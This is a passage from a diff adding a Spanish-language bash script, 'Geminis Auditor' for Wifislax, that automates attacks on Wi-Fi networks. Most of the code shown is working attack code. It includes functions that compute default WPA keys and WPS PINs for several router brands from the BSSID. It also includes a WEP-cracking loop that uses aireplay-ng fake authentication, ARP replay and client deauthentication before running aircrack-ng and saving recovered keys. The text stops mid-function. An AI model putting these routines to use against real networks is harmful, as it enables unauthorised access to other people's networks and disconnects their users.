@@ -1,0 +1,4192 @@
+#!/bin/bash
+
+#########################################################################
+#########################################################################
+##                                                                     ##
+##                          Geminis Auditor                            ##
+##                                                                     ##
+##                         By geminis_demon                            ##
+##                                                                     ##
+##                          Para Wifislax                              ##
+##                                                                     ##
+##                    www.seguridadwireless.net                        ##
+##                                                                     ##
+##                            14/02/2014                               ##
+##                                                                     ##
+#########################################################################
+#########################################################################
+
+#########################################################################
+#########################################################################
+#
+# CHANGELOG
+#
+# xx/xx/xxxx V2.0
+#
+# - Solucionado bug al guardar contraseña en archivo de texto cuando el essid contiene el caracter '/' 
+# - Ahora se pueden utilizar las teclas "a", "w", "d" y "s" para moverse por los menús
+# - Mejoras en la función de resetear interface
+# - Solucionado bug al validar la MAC cuando el primer par es un número impar, ahora hace la comprobación correctamente.
+# - Solucionado conflicto con reavermod y los parámetros de reaver-pixie al atacar redes con BSSID 8C:0C:A3
+# - Añadido soporte para el parámetro --force con pixiewps                                
+# - Solucionado bug por el cual no funcionaba el ataque reaver-pixie con la última versión de pixiewps
+# - Añadida función para conectar/desconectar a un punto de acceso                        
+# - Añadido soporte para algoritmo generador de claves WPA para router SITECOM            
+# - Añadido algoritmo generador de pin por defecto para routers TRENDnet                  
+# - Reparado bug cuando existen varios keygens compatibles con un mismo BSSID             
+# - En el menú de selección de ataque, ahora se pued elegir el algoritmo que se quiere usar para generar el diccionario WEP/WPA o el pin WPS
+# - Mejorada la función de descubrir essid oculto, ahora se vuelven a buscar patrones conocidos teniendo en cuenta el essid descubierto
+# - En el menú principal, se añade información sobre el driver y fabricante de la tarjeta wifi seleccionada, y el fabricante del objetivo seleccionado
+# - Añadido al menú de configuración la opcion de utilizar DixieScan para escanear en busca de objetivos                                                                                
+# - Ahora en el archivo donde se guarda la clave y los datos del ap, también dice que keygen se usó para obtener la clave o el pin
+# - Solucionado bug por el cual en algunos equipos se cerraba el script al moverse por los menus
+# - Cambios estéticos en los menús
+# - Eliminado el parpadeo de pantalla al moverse por los menús
+# - Eliminado el parpadeo de pantalla en los ataques WEP y WPA
+# - Añadido marcador de tiempo transcurrido en los ataques con aircrack-ng
+# - Se sustitulle la función de blacklistear la interfaz por el comando: nmcli device set "$IFACE" managed no
+# - Añadida función que explica el significado de colores y símbolos en la lista de objetivos presionando la tecla "L"
+# - Ahora es posible utilizar el script sin teclado, utilizando solo la rueda del ratón
+# - Solucionado conflicto con wash y el parámetro -C cuando la versión de wash es superior a la 1.4
+# - Ahora se utiliza el binario reaver_pixie del sistema, ya no se inclulle el binario pre-compilado dentro del paquete
+# - Cambios y mejoras varias en el código.
+#
+# 14/04/2015 V1.2
+# - Se añade soporte para el nuevo algoritmo generador de pines para routers Belkin: belkin_pingen
+# - Se añade la opción de filtrar el listado de objetivos por WEP/WPA/WPS
+# - Se añade la opción de acceder al menú de configuración de la lista de objetivos pulsando "C"
+# - Aumentado el tamaño de la lista de objetivos aprobechando el espacio que no se usaba en la terminal.
+#
+# 07/04/2015 V1.1
+# - Añadido ataque WPS Pixie Dust. De forma transparente se lanza pixiewps y si se obtiene el pin se lanza el ataque con reaver
+# - Aumentado el delay al resetear interface para evitar problemas con algunos chipset
+# - Añadido parámetros "-T 1" y "-t 10" para aumentar efectividad con algunos routers
+#
+# 08/01/2015 V1.0
+# - Cambiado el color azul por un tono un poco mas claro para que sea visible en pantallas con poco brillo
+# - Se añade al menú principal información sobre la interface seleccionada, número de objetivos y número de claves obtenidas
+# - Se añade al menú principal la opción de seleccionar otra interface de red
+# - En la utilidad de descubrir rango de IP, ahora se puede introducir la clave WEP/WPA de forma manual
+# - Se añade la función de cambiar dirección MAC en el menú "Otras utilidades"
+# - Se añade la función de descubrir ESSID (o introducir manualmente) al seleccionar un objetivo con ESSID oculto
+# - Se añade la función de crear un listado de claves obtenidas en el menú "Otras utilidades"
+# - Se añade la función de guardar listado de claves en  memoria USB, escritorio de Wifislax, o excritorio de Windows
+# - Se añade soporte para nuevo algoritmo generador de PIN WPS para routers dlink
+# - Solucionado bug en la función de descubrir IP (solo funcionaba con redes que tenían cifrado WPA)
+# - Añadido al menú de configuración la opcion de utilizar airmon-zc (se monta la interface en wlanXmon)
+# - Solucionado bug al cerrar ventana del script, no se desmontaban las interfaces en modo monitor
+# - Solucionado bug con ataque wlanreaver, no reseteaba la interface correctamente al terminar y la dejaba "no gestionada"
+# - Solucionado bug con ataque airlin, dejaba abiertos procesos de wpa_supplicant al terminar
+# - Se añade soporte para nuevo algoritmo generador de claves WPA para routers Wifi-Arnet-XXXX de Argentina
+# - Cambios y mejoras varias en el código.
+#
+# 22/07/2014 V0.9.2
+# - Solucionado bug de deteccion de patrones conocidos con ESSIDs WLAN_XX
+# - Reemplazado keygen belkindecrypter por belkin4xx.py
+#
+# 28/03/2014 V0.9.1
+# - Solucionado problema con FTE_Keygen y ESSID con carácteres no hexadecimales
+#
+# 22/03/2014 V0.9
+# - Se añade generador de claves WPA para routers Belkin
+#
+# 03/03/2014 V0.8
+# - Solucionado bug al buscar el pin genérico en la base de datos cuando el objetivo tiene el ESSID cambiado
+#
+# 26/02/2014 V0.7
+# - Solucionado bug al buscar el pin genérico en la base de datos cuando hay 2 macs iguales
+# - Solucionado bug al intentar seleccionar un objetivo sin haber escaneado previamente
+# - Solucionado bug en la función "DescubrirIP" cuando la red seleccionada no tiene cifrado
+#
+# 19/02/2014 V0.6
+# - Solucionado bug en la función ResetInterface al desmontar el driver iwlwifi de algunos chipset intel
+# - Solucionado un pequeño error estético en el menú "Otras utilidades"
+#
+# 18/02/2014 V0.5
+# - Se limita el tiempo de espera para comprobar actualizaciones para que no se quede el script pillado si el server tarda en responder
+# - Se sube el "sleep" después de resetear la interface para dar tiempo a recuperarse a algunos chipset atheros
+# - Añadido nuevo menú "Otras utilidades"
+# - Añadida función de descubrir rango de IP en redes con DHCP deshabilitado (dentro del menú "Otras utilidades")
+#
+# 15/02/2014 V0.4
+# - Corregida ruta de reavermod
+# - En el ataque reaver WPS, si el BSSID es 8C:0C:A3 no se prueban los algoritmos, se pasa directamente a la fuerza bruta
+#
+# 15/02/2014 V0.3
+# - Se añade opción (en el menú de configuracion) de mostrar fabricante del router en la lista de objetivos
+#
+# 14/02/2014 V0.2
+# - Solucionado error al compenzar un ataque cuando la interface ya no está en modo monitor por alguna razón
+# - Si existe una sesión de reaver guardada, se da la opción de retomarla o eliminarla y empezar de nuevo
+# - En el ataque reaver WPS, si el BSSID es 8C:0C:A3 se lanza reavermod en lugar del reaver normal
+#
+#########################################################################
+#########################################################################
+
+SCRIPT="GeminisAuditor"
+VERSION="2.0beta9"
+RAIZ="/opt/$SCRIPT"
+CLAVES="$RAIZ/claves"
+TMP="$RAIZ/tmp"
+CAPTURAS="$TMP/capturas"
+DICCIONARIOS="$TMP/diccionarios"
+SESIONES="$RAIZ/sesiones"
+MACs_DB="$(cat "$HOME/swireless/patrones_conocidos.txt" 2>/dev/null|grep -v "^#")"
+
+
+##########################################################################
+##########################################################################
+## ALGORITMOS
+
+CheckSum() {
+	
+	pin=$PIN_P1
+	pin=$(echo ${pin}+0|bc -l)
+	acum=0
+	
+	while [ $pin -gt 0 ]; do
+		acum=$(($acum + (3 * ($pin % 10))))
+		pin=$(($pin / 10))
+		acum=$(($acum + ($pin % 10)))
+		pin=$(($pin / 10))
+	done
+	
+	result=$(((10 - ($acum % 10)) % 10))
+	PIN_P2=$(($result % 10000000))
+}
+
+#belkindecrypter() {#
+#	
+#	##################################################################
+#	#
+#	# Generador de claves WPA para routers Belkin
+#	# By geminis_demon 22/03/2014
+#	# Basado en algoritmo de Numlock
+#	#
+#	##################################################################
+#	
+#	Calcular(){
+#	
+#		N=${BSSID:4:8}
+#		
+#		case $MODE in
+#			
+#			0)
+#				N=${N:5:1}${N:1:1}${N:2:1}${N:7:1}${N:4:1}${N:0:1}${N:6:1}${N:3:1}
+#			;;
+#			
+#			1)
+#				N=${N:0:7}$((${N:7:1}+1))
+#				N=${N:5:1}${N:1:1}${N:2:1}${N:7:1}${N:4:1}${N:0:1}${N:6:1}${N:3:1}
+#			;;
+#			
+#			2)
+#				N=${N:0:7}$((${N:7:1}+2))
+#				N=${N:5:1}${N:1:1}${N:2:1}${N:7:1}${N:4:1}${N:0:1}${N:6:1}${N:3:1}
+#			;;
+#			
+#			3)
+#				N=${N:0:7}$((${N:7:1}+1))
+#				N=${N:0:1}${N:1:1}${N:2:1}${N:7:1}${N:4:1}${N:0:1}${N:6:1}${N:3:1}
+#			;;
+#			
+#			4)
+#				N=${N:0:7}$((${N:7:1}+1))
+#				N=${N:0:1}${N:1:1}${N:2:1}${N:7:1}${N:4:1}${N:5:1}${N:6:1}${N:3:1}
+#			;;
+#		esac
+#		
+#		for ((X=0;$X<=7;X++)); do
+#			
+#			Y=${N:$X:1}
+#			
+#			case $Y in
+#				
+#				1) Y=2;;
+#				2) Y=4;;
+#				3) Y=6;;
+#				4) Y=1;;
+#				5) Y=3;;
+#				6) Y=5;;
+#				9) Y=A;;
+#				A) Y=C;;
+#				B) Y=E;;
+#				C) Y=9;;
+#				D) Y=B;;
+#				E) Y=D;;
+#			esac
+#			
+#			KEY=${KEY}$Y
+#		done
+#		
+#		echo $KEY
+#		unset KEY
+#		
+#		for ((X=0;$X<=7;X++)); do
+#			
+#			Y=${N:$X:1}
+#			
+#			case $Y in
+#				
+#				0) Y=9;;
+#				1) Y=4;;
+#				2) Y=4;;
+#				3) Y=6;;
+#				4) Y=2;;
+#				5) Y=6;;
+#				6) Y=3;;
+#				9) Y=A;;
+#				A) Y=C;;
+#				B) Y=E;;
+#				C) Y=9;;
+#				D) Y=B;;
+#				E) Y=D;;
+#			esac
+#			
+#			KEY=${KEY}$Y
+#		done
+#		
+#		KEY=$(echo $KEY|tr '[:upper:]' '[:lower:]')
+#		echo $KEY
+#		unset KEY
+#	}
+#	
+#	BSSID=$(echo "$1"|tr -d ':'|tr '[:lower:]' '[:upper:]')
+#	[ ! "$BSSID" ] || [ ${#BSSID} -ne 12  ] && exit 1
+#	
+#	for MODE in 0 1 2 3 4; do Calcular; done|sort -u
+#}
+
+EasyboxWPS() {
+	
+	##################################################################
+	#
+	# Generador de clave WPA y PIN WPS de VodafoneXXXX 
+	# Escrito en bash por geminis_demon - www.seguridadwireless.net
+	# Algoritmo descubierto por Stefan Viehböck
+	# Gracias a Coeman76 por explicar el funcionamiento del algoritmo
+	#
+	##################################################################
+	
+	# Función que convierte de hex a decimal
+	hex2dec() {
+		
+		HEX=$1
+		echo "ibase=16; $HEX"|bc
+	}
+	
+	# Cogemos los pares 5 y 6
+	PAR5=$(echo $BSSID|cut -d':' -f5)
+	PAR6=$(echo $BSSID|cut -d':' -f6)
+	
+	# Concatenamos los pares 5 y 6 y los convertimos a decimal para sacar el serial
+	SERIAL=$(hex2dec ${PAR5}${PAR6})
+	
+	# Rellenamos con ceros a la izquierda hasta que el número sea de 5 dígitos
+	while [ ${#SERIAL} -lt 5 ]; do SERIAL=0${SERIAL}; done
+	
+	# Cogemos los 4 últimos dígitos del serial
+	SERIAL2=$(echo $SERIAL|cut -c2)
+	SERIAL3=$(echo $SERIAL|cut -c3)
+	SERIAL4=$(echo $SERIAL|cut -c4)
+	SERIAL5=$(echo $SERIAL|cut -c5)
+	
+	# Convertimos cada digito de los pares 4 y 5 a decimal
+	DEC1=$(hex2dec $(echo $PAR5|cut -c1))
+	DEC2=$(hex2dec $(echo $PAR5|cut -c2))
+	DEC3=$(hex2dec $(echo $PAR6|cut -c1))
+	DEC4=$(hex2dec $(echo $PAR6|cut -c2))
+	
+	# Hacemos la suma para obtener los 2 números maestros
+	MAESTRO1=$(((${SERIAL2}+${SERIAL3}+${DEC3}+${DEC4})%16))
+	MAESTRO2=$(((${SERIAL4}+${SERIAL5}+${DEC1}+${DEC2})%16))
+	
+	# Obtenemos los valores de la clave WPA mediante formulas XOR
+	WPA1=$((${MAESTRO1}^${SERIAL5}))
+	WPA2=$((${MAESTRO2}^${DEC2}))
+	WPA3=$((${DEC3}^${SERIAL5}))
+	WPA4=$((${MAESTRO1}^${SERIAL4}))
+	WPA5=$((${MAESTRO2}^${DEC3}))
+	WPA6=$((${DEC4}^${SERIAL4}))
+	WPA7=$((${MAESTRO1}^${SERIAL3}))
+	WPA8=$((${MAESTRO2}^${DEC4}))
+	WPA9=$((${MAESTRO1}^${MAESTRO2}))
+	
+	# Concatenamos los valores y los convertimos a hexadecimal
+	WPA=$(printf "%x%x%x%x%x%x%x%x%x\n" $WPA1 $WPA2 $WPA3 $WPA4 $WPA5 $WPA6 $WPA7 $WPA8 $WPA9)
+	
+	# Cambiamos los ceros por unos
+	WPA=$(echo $WPA|tr '0' '1')
+	
+	# Convertimos las minusculas en mayusculas
+	WPA=$(echo $WPA|tr '[:lower:]' '[:upper:]')
+	
+	# Obtenemos los valores del PIN mediante formulas XOR
+	PIN1=$((${MAESTRO1}^${SERIAL5}))
+	PIN2=$((${MAESTRO1}^${SERIAL4}))
+	PIN3=$((${MAESTRO2}^${DEC2}))
+	PIN4=$((${MAESTRO2}^${DEC3}))
+	PIN5=$((${DEC3}^${SERIAL5}))
+	PIN6=$((${DEC4}^${SERIAL4}))
+	PIN7=$((${MAESTRO1}^${SERIAL3}))
+	
+	# Concatenamos los valores y los convertimos a hexadecimal
+	PIN_P1=$(printf "%x%x%x%x%x%x%x\n" $PIN1 $PIN2 $PIN3 $PIN4 $PIN5 $PIN6 $PIN7)
+	
+	# Convertimos las minusculas en mayusculas
+	PIN_P1=$(echo $PIN_P1|tr '[:lower:]' '[:upper:]')
+	
+	# Convertimos los valores a decimal
+	PIN_P1=$(hex2dec $PIN_P1)
+	
+	# Nos quedamos con los 7 últimos dígitos
+	PIN_P1=$(echo $PIN_P1|rev|cut -c1-7|rev)
+	
+	# Calculamos el checksum
+	CheckSum
+	
+	# Concatenamos la primera parte del pin con la segunda
+	PINWPS=$PIN_P1$PIN_P2
+	
+	# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
+	while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
+}
+
+ComputePIN() {
+	
+	###################################################################
+	#
+	# Yeah Niroz was here, computePIN by ZaoChunsheng, C portado a bash
+	#
+	###################################################################
+	
+	# 6 últimos dígitos de bssid sin ':'
+	MAC=$(echo $BSSID|cut -d':' -f4-6|tr -d ':')
+	
+	# Se convierte de hex a decimal
+	PIN_P1=$(echo "ibase=16; $MAC"|bc)
+	
+	# Elimina dígito más significativo del pin
+	PIN_P1=$(($PIN_P1 % 10000000))
+	
+	# Calculamos el checksum
+	CheckSum
+	
+	# Concatenamos la primera parte del pin con la segunda
+	PINWPS=$PIN_P1$PIN_P2
+	
+	# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
+	while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
+}
+
+FTE_Keygen() {
+	
+	###################################################################
+	#
+	# Pin generator for FTE-XXXX (HG552c)
+	# Original algorithm by kcdtv
+	#
+	###################################################################
+	
+	# FIN_ESSID=XXXX <- FTE-XXXX
+	FIN_ESSID=$(echo $ESSID|cut -c 5-8)
+	
+	# Nos quedamos con el 4 par del bssid xx:xx:xx:XX:xx:xx
+	PAR=$(echo $BSSID|cut -c 10-11)
+	
+	# hex=AB1234, donde essid es FTE-1234 y bssid es xx:xx:xx:AB:xx:xx
+	HEX=$(echo $PAR$FIN_ESSID)
+	
+	# Se convierte de hex a decimal
+	MAC=$(echo "ibase=16; $HEX"|bc)
+	
+	# Elimina dígito más significativo de MAC y +7
+	PIN_P1=$((($MAC % 10000000)+7))
+	
+	# Calculamos el checksum
+	CheckSum
+	
+	# Concatenamos la primera parte del pin con la segunda
+	PINWPS=$PIN_P1$PIN_P2
+	
+	# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
+	while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
+}
+
+PTV_Keygen() {
+
+	PTV_BSSID="$(echo "$BSSID"|tr -d ':')"
+	PTV_CLAVE="${PTV_BSSID:2:10}"
+	echo "$PTV_CLAVE"
+}
+
+TRENDnetWPS(){
+	
+	##################################################################################
+	#
+	#                          ADVERTENCIA LEGAL
+	#
+	#  tdn.sh copyleft 25 junio 2015 (kcdtv para wifi-libre) 
+	#  tdn.sh es un script bash publicado bajo terminos de la licencia GPL v3. Se puede modificar y distribuir 
+	#  libremente siempre que se respecten las reglas establecidas por la free software association ( ver http://gplv3.fsf.org/ )
+	#  Además el autor prohibe expresamente el uso a fines comerciales-mercantiles directas o indirectas
+	#
+	#                             CREDITOS  
+	#  brecha y algorithmo = kcdtv
+	#  codigó = kcdtv con la participación de antares_145 
+	#
+	#  INFO: https://www.wifi-libre.com/topic-160-algoritmo-pin-para-tew-818rdu-v1-ac1900-y-v2-ac3200-de-trendnet.html
+	
+	SCRAMBELDNIC=$(printf `echo $BSSID | awk -F':' '{ print $6 }'``echo $BSSID | awk -F':' '{ print $5 }'``echo $BSSID | awk -F':' '{ print $4 }'`) 
+	                                                               # Con awk y el separador ":" recogemos los campos 6,5 y 4 guardando y invirtiendo así
+	                                                               # el final del BSSID (variable $SCRAMBLEDNIC")
+	CONVERTEDMAC=$(printf '%d\n' 0x$SCRAMBELDNIC)                  # Conversion de hexadecimal a decimal (variable $STRING)  
+	STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`               # supressión del primer digito si la cadena obtenida supera 7 caracteres
+	
+	##################################################################################
+	
+	PIN_P1=$STRING
+	CheckSum
+	# Concatenamos la primera parte del pin con la segunda
+	PINWPS=$PIN_P1$PIN_P2
+	# Rellenamos con ceros a la izquierda hasta que el número sea de 8 dígitos
+	while [ ${#PINWPS} -lt 8 ]; do PINWPS=0${PINWPS}; done
+}
+
+##########################################################################
+##########################################################################
+
+
+##########################################################################
+##########################################################################
+## ATAQUES
+
+InfoObjetivo1() {
+	
+	DATA="$(grep -am1 "$BSSID" "$CAPTURAS/$BSSID-01.csv"|tr -d ' '|awk -F ',' '{print $11}')"
+	[ ! "$DATA" ] && DATA=0
+	PWR="$(grep -am1 "$BSSID" "$CAPTURAS/$BSSID-01.csv"|tr -d ' '|awk -F ',' '{print $9}')"
+	[ ! "$PWR" -o "$PWR" = "-1" ] && PWR=0
+	[ $PWR -ne 0 ] && PWR=$(($PWR+120))
+	[ $PWR -gt 100 ] && PWR=100
+	
+	Clear
+	echo "                     [0;32mINFORMACION DEL OBJETIVO[0m"
+	echo
+	echo "       BSSID          Canal   Cifrado  Señal    Data    ESSID"
+	echo
+	echo -e " $BSSID\t$CANAL\t$CIFRADO\t$PWR%\t$DATA\t$ESSID"
+	echo
+	echo " ----------------------------------------------------------------------"
+}
+
+InfoObjetivo2() {
+	
+	PWR_=$(grep "$IFACE" "/proc/net/wireless"|awk '{print $4}'|sed 's/.$//')
+	
+	if [ "$PWR_" ]; then
+		
+		PWR=$PWR_
+		PWR=$(($PWR+120))
+		[ $PWR -gt 100 ] && PWR=100
+	fi
+	
+	[ ! "$PWR" ] && PWR=0
+	
+	Clear
+	echo "                    [0;32mINFORMACION DEL OBJETIVO[0m"
+	echo
+	echo "             BSSID           Canál   Cifrado  Señal    ESSID"
+	echo
+	echo -e "\t$BSSID\t$CANAL\t$CIFRADO\t$PWR%\t$ESSID"
+	echo
+	echo " ---------------------------------------------------------------------"
+}
+
+DesautenticarClientes() {
+	
+	for CLIENTE in $CLIENTES; do
+		
+		(aireplay-ng -0 10 -a $BSSID -c $CLIENTE "$IFACE_MON" >"$TMP/aireplay-0.txt" 2>&1)
+	done
+	
+	rm -f "$TMP/aireplay-0.txt"
+}
+
+AtaqueAircrackWEP() {
+	
+	GuardarClave() {
+		
+		CLAVE="$(grep "KEY FOUND" "$TMP/aircrack.txt"|awk '{print $7}')"
+		CLAVE_HEX="$(grep "KEY FOUND" "$TMP/aircrack.txt"|awk '{print $4}'|tr -d ':')"
+		[ ! "$CLAVE" ] && CLAVE="$CLAVE_HEX"
+		[ ! "$CLAVE_HEX" ] && CLAVE_HEX="$CLAVE"
+		echo -e "ESSID: $ESSID \nBSSID: $BSSID \nCLAVE ${CIFRADO:0:3}: $CLAVE \nCLAVE HEX: $CLAVE_HEX\nKEYGEN: $KEYGEN" >"$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		sed -i 's/$/\r/' "$CLAVES/${ESSID////#}_${BSSID//:/-}.txt"
+		
+		echo
+		echo "[0;32m - Clave encontrada :)[0m"
+		echo
+		echo "[0;32m - La clave ha sido guardada en:[0m $CLAVES"
+	}
+	
+	Clear
+	Cabecera
+	sleep 0.5
+	SeleccionarInterfaceAuto
+	
+	if [ ! "$(iwconfig 2>/dev/null|grep "^$IFACE_MON "|grep "Mode:Monitor")" ]; then
+		
+		MontarMonitor
+		sleep 3
+	fi
+	
+	Clear
+	rm -f "$DICCIONARIOS/$BSSID.dic" "$CAPTURAS/$BSSID"*csv "$CAPTURAS/$BSSID"*xml "$CAPTURAS/$BSSID"*cap "$TMP/"aireplay*.txt "$TMP/aircrack.txt" "$TMP/aircrack_dicc_terminado.txt"
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	trap "touch $TMP/AircrackWEP_detenido.txt; killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1; break" SIGINT
+	(airodump-ng "$IFACE_MON" -a --bssid $BSSID -c $CANAL -w "$CAPTURAS/$BSSID" >/dev/null 2>&1 &) 
+	while [ ! "$(pgrep "airodump-ng")" ] || [ ! -e "$CAPTURAS/$BSSID-01.csv" ]; do sleep 1; done
+	unset AIREPLAY1 AIREPLAY1_CORRIENDO AIREPLAY2 AIREPLAY2_CORRIENDO AIREPLAY3 AIREPLAY3_CORRIENDO CLIENTES DICC AIRCRACK_INFO AIRCRACK_DICC_FALLIDO
+	[ "$KEYGEN_WEPWPA" ] && DICC="SI"
+	INICIO=$(date +%s)
+	
+	N=0
+	while [ "$(pgrep "airodump-ng")" ]; do
+		
+		SEGUNDOS=$(($(date +%s)-$INICIO))
+		TIEMPO=$(date -d "1970-01-01 $SEGUNDOS sec" +"%H:%M:%S")
+		
+		(
+		InfoObjetivo1
+		
+		AIREPLAY1_CORRIENDO="$(ps -Af|grep "aireplay-ng -1 86400 -q 60 -a $BSSID"|grep -v "grep")"
+		if [ ! "$AIREPLAY1_CORRIENDO" ]; then
+			
+			(aireplay-ng -1 86400 -q 60 -a $BSSID "$IFACE_MON" >"$TMP/aireplay-1.txt" 2>&1 &)
+		fi
+		
+		[ -f "$TMP/aireplay-1.txt" ] && AIREPLAY1="$(grep "^[0-9]" "$TMP/aireplay-1.txt"|tail -1|sed 's/^[0-9]*:[0-9]*:[0-9]*  //')"
+		if [ "$AIREPLAY1" ]; then
+			
+			echo " [0;32mAireplay-ng -1[0m"
+			echo
+			echo " - $AIREPLAY1"
+			echo " ----------------------------------------------------------------------"
+		fi
+		
+		AIREPLAY2_CORRIENDO="$(ps -Af|grep "aireplay-ng -F -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b $BSSID"|grep -v "grep")"
+		if [ ! "$AIREPLAY2_CORRIENDO" ]; then
+			
+			(aireplay-ng -F -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b $BSSID -h $IFACE_MAC -x $PPS "$IFACE_MON" >"$TMP/aireplay-2.txt" 2>&1 &)
+		fi
+		
+		[ -f "$TMP/aireplay-2.txt" ] && AIREPLAY2="$(egrep -o "Read [0-9]* packets...|Sent [0-9]* packets...\([0-9]* pps\)" "$TMP/aireplay-2.txt"|tail -1)"
+		if [ "$AIREPLAY2" ]; then
+			
+			echo " [0;32mAireplay-ng -2[0m"
+			echo
+			echo " - $AIREPLAY2"
+			echo " ----------------------------------------------------------------------"
+		fi
+		
+		AIREPLAY3_CORRIENDO="$(ps -Af|grep "aireplay-ng -3 -b $BSSID"|grep -v "grep")"
+		if [ ! "$AIREPLAY3_CORRIENDO" ]; then
+			
+			(aireplay-ng -3 -b $BSSID -h $IFACE_MAC -x $PPS "$IFACE_MON" >"$TMP/aireplay-3.txt" 2>&1 &)
+		fi
+		
+		[ -f "$TMP/aireplay-3.txt" ] && AIREPLAY3="$(grep -o "Read [0-9]* packets (got [0-9]* ARP requests and [0-9]* ACKs), sent [0-9]* packets...([0-9]* pps)" \
+		"$TMP/aireplay-3.txt"|tail -1|sed 's/, s/\n - S/')"
+		if [ "$AIREPLAY3" ]; then
+			
+			echo " [0;32mAireplay-ng -3[0m"
+			echo
+			echo " - $AIREPLAY3"
+			echo " ----------------------------------------------------------------------"
+		fi
+		
+		if [ "$(echo "$AIREPLAY3"|grep "(0 pps)")" ] || [ ! "$CLIENTES" ]; then
+			
+			CLIENTES="$(grep "$BSSID" "$CAPTURAS/$BSSID-01.csv"|egrep -v "^$BSSID|not associated"|awk -F ',' '{print $1}')"
+		fi
+		
+		if [ "$(echo "$AIREPLAY3"|grep "(0 pps)")" ] && [ "$CLIENTES" ] ; then
+			
+			[ $N -gt 0 ] && N=$(($N-1))
+			
+			if [ $N -eq 0 -a ! -f "$TMP/aireplay-0.txt" ]; then
+				
+				(DesautenticarClientes &)
+				N=40
+			fi
+		fi
+		
+		echo
+		echo "[0;32m - Tiempo transcurrido:[0m $TIEMPO"
+		
+		if [  "$(echo "$AIREPLAY1"|grep "Association successful")" ]; then
+			
+			echo
+			echo "[0;32m - Asociación falsa correcta[0m"
+		else
+			echo
+			echo "[0;32m - Esperando autenticación falsa...[0m"
+		fi
+		
+		if [ ! "$CLIENTES" ]; then
+			
+			echo
+			echo "[0;32m - Esperando clientes...[0m"
+		else 
+			echo
+			echo "[0;32m - Clientes encontrados:[0m $(echo -n "$CLIENTES"|tr '\n' ' ')"
+			
+			if [ -f "$TMP/aireplay-0.txt" ]; then
+				
+				echo
+				echo "[0;32m - Desautenticando clientes...[0m"
+			fi
+		fi
+		
+		if [ "$AIRCRACK_DICC_FALLIDO" ]; then
+			
+			echo
+			echo "[0;31m - Ataque Aircrack-ng con diccionario fallido[0m"
+		fi
+		
+		if [ "$DICC" = "SI" ] && [ $DATA -ge 4 ]; then
+			
+			echo
+			echo "[0;32m - Lanzando Aircrack-ng con diccionario...[0m $AIRCRACK_INFO"
+			
+			AIRCRACK_DICC_CORRIENDO="$(ps -Af|grep "aircrack-ng -K -b $BSSID -w"|grep -v "grep")"
+			if [ ! "$AIRCRACK_DICC_CORRIENDO" ]; then
+				
+				if [ ! -e "$TMP/aircrack_dicc_terminado.txt" ]; then
+					
+					if [ ! -f "$DICCIONARIOS/$BSSID.dic" ]; then
+						
+						echo
+						echo -n "[0;32m - Generando diccionario...[0m "
+						
+						CrearDiccionario >/dev/null 2>&1
+						
+						[ $? -eq 0 ] && echo "[0;32m√ [0m"||echo
+					fi
+					
+					( (aircrack-ng -K -b $BSSID -w "$DICCIONARIOS/$BSSID.dic" "$CAPTURAS/$BSSID-01.cap" >"$TMP/aircrack.txt" 2>&1; touch "$TMP/aircrack_dicc_terminado.txt") &)
+				else
+					if [ "$AIRCRACK_INFO" = "Quitting aircrack-ng..." ]; then
+						
+						AIRCRACK_DICC_FALLIDO=SI
+						rm -f "$TMP/aircrack.txt" 
+						unset DICC
+					fi
+				fi
+			fi
+		fi
+		
+		if [ ! "$DICC" ] && [ $DATA -ge 5000 ]; then
+			
+			echo
+			echo "[0;32m - Lanzando Aircrack-ng PTW...[0m $AIRCRACK_INFO"
+			
+			unset KEYGEN
+			AIRCRACK_CORRIENDO="$(ps -Af|grep "aircrack-ng -b $BSSID"|grep -v "grep")"
+			[ ! "$AIRCRACK_CORRIENDO" ] && (aircrack-ng -b $BSSID "$CAPTURAS/$BSSID-01.cap" >"$TMP/aircrack.txt" &)
+		fi
+		
+		if [ -f "$TMP/aircrack.txt" ]; then
+			
+			AIRCRACK_INFO="$(tac "$TMP/aircrack.txt"|\
+			egrep -om1 "Reading packets, please wait...|Tested [0-9]* keys \(got [0-9]* IVs\)|Failed. Next try with [0-9]* IVs.|Quitting aircrack-ng...|KEY FOUND\!")"
+		fi
+		
+		if [ "$AIRCRACK_INFO" = "KEY FOUND!" ]; then
+			
+			GuardarClave
+			killall airodump-ng
+		fi
+		) >"$TMP/AtaqueAircrackWEP.txt"
+		
+		cat "$TMP/AtaqueAircrackWEP.txt"
+		sleep 0.5
+	done
+	
+	killall airodump-ng aireplay-ng aircrack-ng >/dev/null 2>&1
+	
+	if [ -f "$TMP/AircrackWEP_detenido.txt" ]; then
+		
+		rm -f "$TMP/AircrackWEP_detenido.txt"
+		
+		echo
+		echo "[0;31m - Se ha detenido el proceso[0m"
+	fi
+	
+	echo
+	echo "[0;32m - Presiona cualquier tecla para volver al menú principal[0m"
+	
+	while read -sn1 TECLA; do
+		
+		LeerTecla
+		break
+	done
+	
+	MenuPrincipal
+}
+
+AtaqueWlanreaver() {
+	
+	##################################################################
+	#
+	# Ataque de diccionario a redes con cifrado WEP sin modo monitor
+	# Escrito en bash por geminis_demon
+	# Idea original por |FluiD|
+	#
+	##################################################################
+	
+	Asociacion() {
+		
+		N=1
+		while [ $N -le 3 -a ! -e "$TMP/wlanreaver_detenido.txt" ]; do
+			
+			echo
+			echo "[0;32m - Intentando asociación falsa...[0m $N/3"
+			
+			IP="192.168.$SUBRED.$((RANDOM%=255))"
+			
+			ifconfig $IFACE up
+			iwconfig $IFACE essid "$ESSID"
+			ifconfig $IFACE $IP
+			iwconfig $IFACE key open
+			iwconfig $IFACE mode manage
+			[ "$(iwconfig $IFACE key s:ZZZZZZZZZZZZZ)" ] || [ "$(iwconfig $IFACE key 3030303030)" ]
+			sleep 1
+			iwconfig $IFACE ap $BSSID
+			
+			ESPERA=15
+			while [ $ESPERA -ge 0 -a ! -e "$TMP/wlanreaver_detenido.txt" ]; do
